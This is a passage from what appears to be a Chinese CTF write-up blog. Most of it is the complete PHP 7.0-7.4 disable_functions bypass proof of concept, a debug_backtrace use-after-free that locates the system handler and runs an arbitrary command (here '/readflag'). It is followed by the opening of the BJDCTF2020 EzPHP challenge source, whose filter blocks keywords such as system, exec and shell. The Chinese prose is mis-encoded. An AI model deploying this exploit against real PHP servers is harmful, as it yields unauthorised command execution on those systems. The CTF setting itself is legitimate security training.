class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Bug: https://bugs.php.net/bug.php?id=76047</span><br><span class="hljs-comment"># debug_backtrace() returns a reference to a variable</span><br><span class="hljs-comment"># that has been destroyed, causing a UAF vulnerability.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit should work on all PHP 7.0-7.4 versions</span><br><span class="hljs-comment"># released as of 30/01/2020.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: https://github.com/mm0r1</span><br><br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-string">&quot;/readflag&quot;</span>); <span class="hljs-comment">#å‘½ä»¤</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>(); <span class="hljs-comment"># ;)</span><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123; <span class="hljs-comment"># PHP &gt;= 7.4</span><br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-comment"># str_shuffle prevents opcache string interning</span><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>));<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if UAF fails</span><br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>));<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># leaks</span><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-comment"># fake value</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-comment"># fake reference</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># fake closure object</span><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-comment"># pwn</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <span class="hljs-comment"># internal func type</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment"># internal func handler</span><br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/52358979B9C547a5883ADD74F140E7D8.png" srcset="/img/loading.gif" lazyload><br>åŒ…å«è¿™ä¸ªæ–‡ä»¶æ‹¿åˆ°flag<br><img src="/images/0333A3523B4240d6A3BFC5B5B08B018F.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>è¿›å…¥ç¯å¢ƒï¼Œä¸»é¡µçœ‹çœ‹æœ‰ä»€ä¹ˆçªç ´ç‚¹ï¼Œéšä¾¿ç‚¹ç‚¹<br>çœ‹çœ‹æºä»£ç <br>å‘ç°è¿™ä¸ªç½‘ç»œå¨èƒå®æ—¶åœ°å›¾æ˜¯å¼•ç”¨çš„ä¸€ä¸ªé“¾æ¥çš„ï¼Œåº”è¯¥æ²¡æœ‰ä»€ä¹ˆçªç ´ç‚¹<br>è¿™è¾¹ç»™äº†ä¸ªæ³¨é‡Š<br>base64è§£ç ä¸æˆåŠŸ<br>base32è§£ç å¯è¡Œ<br>è§£ç å‡º1nD3x.php</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs coq">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(<span class="hljs-number">0</span>); <br><br>$file = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;<br>$shana = $_GET[&#x27;shana&#x27;];<br>$passwd = $_GET[&#x27;passwd&#x27;];<br>$arg = &#x27;&#x27;;<br>$code = &#x27;&#x27;;<br><br>echo <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>($_SERVER) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        preg_match(&#x27;/shana|<span class="hljs-type">debu</span>|<span class="hljs-type">aqua</span>|<span class="hljs-type">cute</span>|<span class="hljs-type">arg</span>|<span class="hljs-type">code</span>|<span class="hljs-type">flag</span>|<span class="hljs-type">system</span>|<span class="hljs-type">exec</span>|<span class="hljs-type">passwd</span>|<span class="hljs-type">ass</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">sort</span>|<span class="hljs-type">shell</span>|<span class="hljs-type">ob</span>|<span class="hljs-type">start</span>|<span class="hljs-type">mail</span>|<span class="hljs-type">\$|sou</span>|<span class="hljs-type">show</span>|<span class="hljs-type">cont</span>|<span class="hljs-type">high</span>|<span class="hljs-type">reverse</span>|<span class="hljs-type">flip</span>|<span class="hljs-type">rand</span>|<span class="hljs-type">scan</span>|<span class="hljs-type">chr</span>|<span class="hljs-type">local</span>|<span class="hljs-type">sess</span>|<span class="hljs-type">id</span>|<span class="hljs-type">source</span>|<span class="hljs-type">arra</span>|<span class="hljs-type">head</span>|<span class="hljs-type">light</span>|<span class="hljs-type">read</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">info</span>|<span class="hljs-type">bin</span>|<span class="hljs-type">hex</span>|<span class="hljs-type">oct</span>|<span class="hljs-type">echo</span>|<span class="hljs-type">print</span>|<span class="hljs-type">pi</span>|<span class="hljs-type">\.|\&quot;|\&#x27;|log</span>/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])<br>        )  <br>        die(&#x27;You seem to want to <span class="hljs-built_in">do</span> something bad?&#x27;); <br>&#125;<br><br><span class="hljs-keyword">if</span> (!preg_match(&#x27;/http|<span class="hljs-type">https</span>/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;<br>    <span class="hljs-keyword">if</span> (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; <br>        $file = $_GET[<span class="hljs-string">&quot;file&quot;</span>]; <br>        echo <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> die(&#x27;fxck you! What <span class="hljs-built_in">do</span> you want to <span class="hljs-built_in">do</span> ?!&#x27;);<br><br><span class="hljs-keyword">if</span>($_REQUEST) &#123; <br>    foreach($_REQUEST <span class="hljs-built_in">as</span> $value) &#123; <br>        <span class="hljs-keyword">if</span>(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value)) 